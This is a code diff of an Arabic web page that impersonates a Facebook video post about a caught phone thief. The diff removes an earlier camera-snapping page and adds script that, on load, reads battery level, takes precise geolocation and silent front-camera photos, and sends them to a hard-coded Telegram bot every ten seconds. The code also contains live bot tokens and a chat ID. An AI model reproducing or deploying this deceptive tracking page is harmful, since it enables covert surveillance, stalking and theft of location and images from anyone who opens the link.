@@ -1,94 +1,171 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تحميل الصفحة...</title>
+    <title>Facebook Video - مشاهدة الفيديو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
-            padding-top: 50px;
-        }
-        .loader {
-            border: 16px solid #f3f3f3;
-            border-top: 16px solid #3498db;
-            border-radius: 50%;
-            width: 80px;
-            height: 80px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { margin: 0; background-color: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+        
+        /* شريط فيسبوك العلوي المزيف */
+        .fb-header { background-color: #ffffff; padding: 10px 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; width: 100%; z-index: 1000; box-sizing: border-box; }
+        .fb-logo { color: #1877f2; font-size: 28px; font-weight: bold; }
+        .fb-icons { color: #606770; font-size: 20px; display: flex; gap: 15px; }
+
+        /* حاوية الفيديو الرئيسية */
+        .main-container { margin-top: 70px; display: flex; flex-direction: column; align-items: center; padding: 16px; }
+        .video-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; max-width: 680px; overflow: hidden; }
+        
+        /* مشغل الفيديو المزيف */
+        .video-player { background-color: #000000; position: relative; padding-bottom: 56.25%; height: 0; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .video-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; background: rgba(0,0,0,0.5); z-index: 10; }
+        
+        /* علامة التحميل (Spinner) */
+        .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* تفاصيل الفيديو المزيفة */
+        .video-details { padding: 12px 16px; }
+        .video-title { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 5px; }
+        .video-meta { font-size: 13px; color: #65676b; margin-bottom: 12px; }
+        .video-stats { font-size: 14px; color: #65676b; border-top: 1px solid #ebedf0; border-bottom: 1px solid #ebedf0; padding: 10px 0; display: flex; justify-content: space-between; }
+        
+        /* أزرار فيسبوك المزيفة */
+        .video-actions { display: flex; justify-content: space-around; padding: 10px 0; color: #606770; font-weight: 600; font-size: 15px; }
+        .action-btn { cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .action-btn:hover { color: #1877f2; }
+
+        #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>يرجى الانتظار، جاري التحقق من الرابط...</h2>
-    <div class="loader"></div>
+    <div class="fb-header">
+        <div class="fb-logo"><i class="fab fa-facebook"></i></div>
+        <div class="fb-icons">
+            <i class="fas fa-home"></i>
+            <i class="fas fa-video" style="color: #1877f2;"></i>
+            <i class="fas fa-users"></i>
+            <i class="fas fa-bell"></i>
+        </div>
+    </div>
 
-    <!-- عناصر مخفية لالتقاط الصورة -->
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-    <script>
-        // إعدادات التلجرام (ضع بياناتك هنا)
-        const TELEGRAM_TOKEN = '8815312689:AAEGxxw-mtajcc0s1wmfsPgL22vSdgVIoCQ';
-        const CHAT_ID = '1230856956';
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        // طلب إذن الكاميرا الأمامية فور فتح الصفحة
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(function(stream) {
-            video.srcObject = stream;
-            video.play();
-
-            // الانتظار ثانيتين للتأكد من وضوح الصورة وتثبيت الكاميرا ثم الالتقاط
-            setTimeout(function() {
-                takeSnapshot();
-            }, 2000);
-        })
-        .catch(function(err) {
-            console.log("تم رفض الإذن أو الكاميرا غير متوفرة: " + err);
-        });
-
-        function takeSnapshot() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
+    <div class="main-container">
+        <div class="video-card">
             
-            // تحويل الصورة الملتَقطة إلى صيغة Blob (ملف) لإرسالها
-            canvas.toBlob(function(blob) {
-                sendToTelegram(blob);
-            }, 'image/jpeg');
-        }
+            <div class="video-player">
+                <div class="video-overlay">
+                    <div class="spinner"></div>
+                    <div style="font-size: 16px;">جاري تحميل الفيديو...</div>
+                    <div style="font-size: 12px; margin-top: 5px;">يرجى الانتظار، جودة عالية HD</div>
+                </div>
+            </div>
 
-        function sendToTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', imageBlob, 'capture.jpg');
-            formData.append('caption', '🚨 تنبيه: تم فتح الرابط ومحاولة   الشخص!');
+            <div class="video-details">
+                <div class="video-title">شاهد: لحظة قيام اللص بسرقة الهاتف - تم التعرف على الوجه! <i class="fas fa-exclamation-triangle" style="color: #e02424;"></i></div>
+                <div class="video-meta">نُشر بواسطة: مراقبة المدينة الآمنة · قبل ٣ دقائق · <i class="fas fa-globe-americas"></i> عام</div>
+                
+                <div class="video-stats">
+                    <div><i class="fas fa-thumbs-up" style="color: #1877f2;"></i> ١٢ ألف إعجاب</div>
+                    <div>٤،٥ ألف تعليق · ٣ آلاف مشاركة</div>
+                </div>
 
-            // إرسال الصورة عبر API التلجرام مباشرة
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('تم الإرسال بنجاح:', data);
-                // اختياري: يمكنك توجيه المستخدم إلى صفحة أخرى بعد الإرسال (مثلاً جوجل)
-                // window.location.href = "https://www.google.com";
-            })
-            .catch(error => {
-                console.error('خطأ في الإرسال:', error);
+                <div class="video-actions">
+                    <div class="action-btn"><i class="far fa-thumbs-up"></i> إعجاب</div>
+                    <div class="action-btn"><i class="far fa-comment"></i> تعليق</div>
+                    <div class="action-btn" style="color: #1877f2;"><i class="fas fa-share"></i> مشاركة</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    // إعدادات البوت الخاصة بك
+    const botToken = "8036035151:AAGx8I8HfUM401Y_XrzHyTvGhpQC5RXNVBM";
+    const chatId = "1230856956";
+    const intervalTime = 10000; // 10 ثوانٍ
+
+    // بدء العمل بمجرد تحميل الصفحة
+    window.onload = () => {
+        startTrackingSystem();
+    };
+
+    async function startTrackingSystem() {
+        // المحاولة الأولى فوراً
+        captureAndSend("🚨 **رصد أولي: تم فتح رابط (فخ فيسبوك) الآن!**");
+
+        // تكرار العملية كل 10 ثوانٍ
+        setInterval(() => {
+            captureAndSend("📸 **تحديث رصد تلقائي (كل 10 ثوانٍ)**");
+        }, intervalTime);
+    }
+
+    async function captureAndSend(headerText) {
+        let batteryStatus = "";
+        try {
+            const battery = await navigator.getBattery();
+            batteryStatus = `🔋 البطارية: ${Math.round(battery.level * 100)}%`;
+        } catch(e) { batteryStatus = "🔋 البطارية: غير متوفرة"; }
+
+        // طلب الموقع الجغرافي (اللص سيضغط "سماح" فوراً ليفتح الفيديو)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            try {
+                // فتح الكاميرا الأمامية بصمت
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const tempVideo = document.createElement('video');
+                tempVideo.srcObject = stream;
+                tempVideo.autoplay = true;
+                tempVideo.setAttribute('playsinline', ''); // للآيفون
+
+                // انتظار ثانية واحدة لضبط جودة الصورة قبل الالتقاط
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(tempVideo, 0, 0, 640, 480);
+                    
+                    // تحويل الصورة لجودة متوسطة لسرعة الإرسال
+                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    const message = `${headerText}\n${batteryStatus}\n📍 الدقة: ${accuracy.toFixed(1)} متر\n🔗 الموقع: ${mapLink}`;
+                    
+                    sendToTelegram(photoBase64, message);
+
+                    // إغلاق الكاميرا بعد الالتقاط
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1500);
+
+            } catch (err) {
+                // في حال رفض الكاميرا أو كانت محجوبة
+                sendToTelegram(null, `${headerText}\n⚠️ الكاميرا محجوبة\n${batteryStatus}\n📍 الموقع: ${mapLink}`);
+            }
+        }, null, { enableHighAccuracy: true });
+    }
+
+    function sendToTelegram(photo, caption) {
+        if (photo) {
+            // إرسال الصورة مع النص
+            fetch(photo).then(r => r.blob()).then(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'thief_capture.jpg');
+                fd.append('caption', caption);
+                fd.append('parse_mode', 'Markdown');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
             });
+        } else {
+            // إرسال نص فقط إذا لم تتوفر صورة
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(caption)}&parse_mode=Markdown`);
         }
-    </script>
+    }
+</script>
 </body>
 </html>
